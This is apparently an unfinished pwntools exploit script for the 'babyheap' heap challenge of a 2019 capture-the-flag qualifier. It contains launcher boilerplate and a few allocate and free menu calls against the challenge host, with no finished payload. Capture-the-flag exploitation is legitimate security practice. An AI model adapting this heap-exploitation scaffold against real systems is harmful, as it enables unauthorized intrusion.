#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('babyheap')

host = args.HOST or 'babyheap.quals2019.oooverflow.io'
port = int(args.PORT or 5000)

env={'LD_PRELOAD':'./libc.so'}
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#break *(0x{exe.entry:x}+0x555555554000)
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal=['tmux','split','-h']
io = start()
def snd(s):
    io.recvuntil('>')
    io.send(str(s))
snd('M')
snd(100)
snd('sssalut\n')
snd('F')
snd(0)
snd('M')
snd(300)
snd('papa\n')
snd('F')
snd(0)

io.interactive()

